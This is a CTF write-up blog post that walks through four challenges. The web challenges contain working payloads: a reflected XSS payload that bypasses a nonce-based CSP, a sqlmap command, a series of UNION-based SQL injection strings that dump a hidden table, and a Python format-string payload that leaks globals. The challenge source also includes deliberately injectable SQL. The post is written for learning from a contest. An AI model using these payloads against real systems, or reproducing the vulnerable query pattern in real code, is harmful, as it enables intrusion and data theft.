---
layout: post
title: Break the syntax
description: Break the syntax CTF notes
summary: Break the syntax CTF notes
tags: [CTF, XSS, format string, SQL injection]
---

It's has been a while since I played CTF games. Anyway, I share my struggles as an amateur player.  

### 1. Web challenge - Never gonna give you flag  

![Landing page](/assets/img/never-gonna-give-you-flag.png)

This landing page contained 6 links where 2 of them contained below interesting codes.

```html
<html>
<head><script src="jquery-3.5.1.min.js"></script></head>
<body>
  <div> Rick never gonna: </div>
  <p id="rick-says">
  </p>
  <img src="images/rick6.jpg">

  <script nonce="JIYr435smMmKG1nAAFNlrKUewAEaTWt1">
    var arg = decodeURIComponent(window.location.search.substr(1).split('=')[1]);
    if (arg !== "undefined") {
      $('#rick-says').append(arg);
    }
      //console.log(arg)
  </script>

</body>
</html>
```

```html
<html>
<head><script src="jquery-3.5.1.min.js"></script></head>
<body>
  <img src="images/rick2.jpg" nonce="JIYr435smMmKG1nAAFNlrKUewAEaTWt1">

  <script nonce="JIYr435smMmKG1nAAFNlrKUewAEaTWt1">
    $.ajax({
      url: "flag.php",
      headers: {
        "Nonce": "JIYr435smMmKG1nAAFNlrKUewAEaTWt1"
      },
      success: function (result) {
        console.log(result);
      }
    });
  </script>

</body>
</html>
```
The first page exposed XSS vulnerability and the second one hinted toward the flag. My first task was to successfully get `XSS!` message in the developer console.
```
./Never_gonna_say_goodbye.html?search=<script>console.log("XSS!")</script>
```  
This attempt threw a Content Security Policy error in the developer console. So fixed it with my second try.
```
./Never_gonna_say_goodbye.html?search=<script nonce="JIYr435smMmKG1nAAFNlrKUewAEaTWt1">console.log("XSS!")</script>
```
The previous error was gone but the `arg` variable held only `<script nonce` part from my payload. So replaced `=` sign with `%3D` to get around the split.
```
./Never_gonna_say_goodbye.html?search=<script nonce%3D"JIYr435smMmKG1nAAFNlrKUewAEaTWt1">console.log("XSS!")</script>
```
Finally, the "XSS!" message arrived in the dev console. Good to go for the flag.
```
./Never_gonna_say_goodbye.html?search=<script nonce%3D"JIYr435smMmKG1nAAFNlrKUewAEaTWt1">$.ajax({ url: "flag.php", headers: { "Nonce": "JIYr435smMmKG1nAAFNlrKUewAEaTWt1" }, success: function (r) { console.log(r); } });</script>
```
The flag received in the dev console: `BtS-CTF{r1cK_g4v3_uP_y0ure_h3lpl3ss}`.

***    
  
### 2. Web challenge - Cheated lottery  
![Landing page](/assets/img/cheated-lottery.png)
The landing page source hinted at the `/?source=1` endpoint that contained the server-side code.

```python
from flask import Flask, render_template, request 
from dotenv import load_dotenv 
import mysql.connector 
import os 
load_dotenv() 
def get_coupons(form):
  coupons = list()
  mydb = mysql.connector.connect( host=os.getenv('mysql_host'), user=os.getenv('mysql_user'), password=os.getenv('mysql_pwd'), database=os.getenv('mysql_db') ) mycursor = mydb.cursor()
  try:
    mycursor.execute("SELECT * FROM coupons WHERE code = '" + str(form['cid']) + "'")
  except:
    pass
      myresult = mycursor.fetchall()
      for x in myresult:
        coupons.append({ 'code': x[1], 'value': x[2] })
        mycursor.close()
        return coupons

app = Flask(__name__)
@app.route('/', methods=['POST', 'GET'])
def index(source=None):
  if request.method == "POST":
    coupons = get_coupons(request.form)
    if coupons == []:
      return render_template('list.html', error="Sorry, you didn't win")
    else:
      return render_template('list.html', coupons=coupons)
  else:
    if request.args.get('source') == '1':
      with open(__file__, 'r') as r:
        return r.read().strip()
    else:
      return render_template('base.html')

if __name__ == "__main__":
  app.run(host="0.0.0.0", port=7331)
```
The code section to query MySQL database is intentionally left exposed to SQL Injections.
```bash
sqlmap -r ./request.txt -p cid
```
The SQLmap tool reported that `UNION attack` with 3 columns is the way to go.
My first injection was for acquiring the database name: `test' UNION SELECT DATABASE(), DATABASE(), DATABASE() WHERE 'x' = 'x`  
The actual executed query becomes:  
```SQL
SELECT * FROM coupons WHERE code = 'test' UNION SELECT DATABASE(), DATABASE(), DATABASE() WHERE 'x' = 'x'
```
Received the database name as `ff86e476b1344851f095759d1eeccda72d9363ad`. The second injection was to list all tables in this database: `test' UNION SELECT NULL, table_name, table_type FROM information_schema.tables WHERE 'x' = 'x`  
The correctly executed query becomes:  
```SQL
SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, table_name, table_type FROM information_schema.tables WHERE 'x' = 'x'
```
Revealed table names were `c2VjcmV0LWRi` and `coupons`. The third injection was to get column names of the `c2VjcmV0LWRi` table: `test' UNION SELECT NULL, column_name, column_name FROM information_schema.columns WHERE table_schema  = 'ff86e476b1344851f095759d1eeccda72d9363ad' AND table_name = 'c2VjcmV0LWRi`   
The correctly executed query becomes:  
```SQL
SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, column_name, column_name FROM information_schema.columns WHERE table_schema  = 'ff86e476b1344851f095759d1eeccda72d9363ad' AND table_name = 'c2VjcmV0LWRi'
```
Revealed only one column named `ZGVmaW5pdGVseS1ub3QtZmxhZw`. The fourth injection explored the data of the `c2VjcmV0LWRi` table: `test' UNION SELECT NULL, ZGVmaW5pdGVseS1ub3QtZmxhZw, ZGVmaW5pdGVseS1ub3QtZmxhZw FROM c2VjcmV0LWRi WHERE 'x' = 'x`  
The correctly executed query becomes:  
```SQL
SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, ZGVmaW5pdGVseS1ub3QtZmxhZw, ZGVmaW5pdGVseS1ub3QtZmxhZw FROM c2VjcmV0LWRi WHERE 'x' = 'x'
```
The flag `BtS-CTF{7h475_h0w_y0u_ch347_1n_94m35}` was only thing in table `c2VjcmV0LWRi`.

***  

### 3. OSINT challenge - Lost Photos
> God! All my photos from Moscow are gone, Hard disk had some problems, Usually it happens to my friends, Not to me, Thomas Garminas will be so upset.
> PS.: When you find what you are looking for, just put it between curly brackets and win this challenge

![Google Thomas Garminas](/assets/img/lost-photos.png)
![Thomas Garminas - Youtube channel](/assets/img/lost-photos-1.png)
Submitting `BtS-CTF{02.12.2017}` failed. I was afraid that the flag might be in this silent video.  

![Google Thomas Garminas - Firefox](/assets/img/lost-photos-2.png)
![Google concert 02.12.2017 - Firefox](/assets/img/lost-photos-3.png)
By luck, Firefox saved the day. Chrome was not showing the hint. `BtS-CTF{Amaranthe}` - accepted.  

***    

### 4. Misc challenge - Simple game calculator
A simple python game source code was exposed via the debug option. 
```python
import os, sys

class Multiplayer(object):
    def __init__(self, name, difficulty, players):
        self.name = name
        self.difficulty = "easy" # No one will create hard game, no need to implement it
        self.players = players

    def show_details(self):
        print('{0.players} can play this easy game called' + self.name).format(self)

class CTFGame(object):
    def __init__(self):
        self.flag = "asd"

games = {
    'multi': list()
}

def user_choice():
    menu = """
    Welcome to Simple Game Creator where you can create your game of choice!

    1. View all games
    2. Create your own multiplayer game
    """
    print(menu)

    sys.stdout.write("Choose wisely >> ")
    sys.stdout.flush()
    return sys.stdin.readline()

def add_multi():
    sys.stdout.write("Name your own multiplayer game >> ")
    sys.stdout.flush()
    name = sys.stdin.readline().strip()
    sys.stdout.write("What difficulty will it have (hard, easy)? >> ")
    sys.stdout.flush()
    diff = sys.stdin.readline().strip()
    sys.stdout.write("How many players can play this? >> ")
    sys.stdout.flush()
    players = sys.stdin.readline().strip()

    games['multi'].append(Multiplayer(name, diff, players))

    print("You created your own multiplayer game")

def show_games():
    print("\nYour games: ")
    print("\nMultiplayers: ")
    for multi in games['multi']:
        multi.show_details()
    print("")

def main():
    banner = """Banner"""

    while True:
        print(banner)
        sys.stdout.flush()
        choice = user_choice().strip()
        choices = {
            '1': show_games,
            '2': add_multi
        }
        ans = choices.get(choice, None)
        if not ans:
            print("There is no such option mate")
        else:
            ans()

if __name__ == "__main__":
    main()


```
Several years ago, I read an article about the format string vulnerability in C code. Until today, I never imagined the concept can be applied to python as well. The only thing fishy in the code was the print statement with formatting. Google: “format string vulnerability python” yielded this [GeeksForGeeks](https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/) article. I was able to manage to come up with  `{0.__init__.__globals__}` to read the flag in the game. Anyway, these were all the challenges that I successfully solved during the live event. Event ended about an hour ago, organizers have already published everything to this git [repository](https://github.com/PWrWhiteHats/BtS-CTF-Challenges-03-2021).  

Thanks to those who organized and sponsored the event. It was a really fun experience for me after all.